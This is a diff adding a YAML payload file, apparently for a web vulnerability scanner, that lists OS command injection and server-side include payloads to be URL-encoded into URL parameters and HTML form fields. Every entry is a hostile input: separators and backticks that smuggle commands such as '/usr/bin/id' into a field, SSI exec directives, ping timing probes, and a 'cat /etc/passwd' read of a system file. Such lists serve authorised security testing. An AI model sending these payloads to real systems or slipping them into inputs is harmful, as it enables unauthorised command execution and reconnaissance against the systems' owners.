@@ -1,0 +1,42 @@
+payload:
+  - "cat /etc/passwd"
+  - "ls -la /tmp"
+  - "ls -la /home"
+  - "ping -i 30 127.0.0.1 "
+  - "ping 127.0.0.1"
+  - '<!--#exec cmd="/usr/bin/id"-->'
+  - '<!--#exec cmd="id"-->'
+  - ";netstat -a;"
+  - "|/usr/bin/id"
+  - "|/usr/bin/id|"
+  - "||/usr/bin/id|"
+  - "||/usr/bin/id;"
+  - ";|/usr/bin/id|"
+  - "\n/bin/ls -al\n"
+  - "\n/usr/bin/id\n"
+  - "\n/usr/bin/id;"
+  - "\n/usr/bin/id|"
+  - ";/usr/bin/id\n"
+  - "|usr/bin/id\n"
+  - "`/usr/bin/id`"
+  - "|/bin/ls -al"
+  - "a);/usr/bin/id"
+  - "a;/usr/bin/id"
+  - "a);/usr/bin/id;"
+  - "a;/usr/bin/id;"
+  - "a);/usr/bin/id|"
+  - "a;/usr/bin/id|"
+  - "a)|/usr/bin/id"
+  - "a|/usr/bin/id"
+  - "a)|/usr/bin/id;"
+  - "a|/usr/bin/id"
+  - ";system('id')"
+  - ";system('/usr/bin/id')"
+  - "& ping -i 30 127.0.0.1 &"
+  - "& ping -n 30 127.0.0.1 &"
+  - "`ping 127.0.0.1`"
+encoder:
+  - URL
+placeholder:
+  - URLParam
+  - HTMLForm
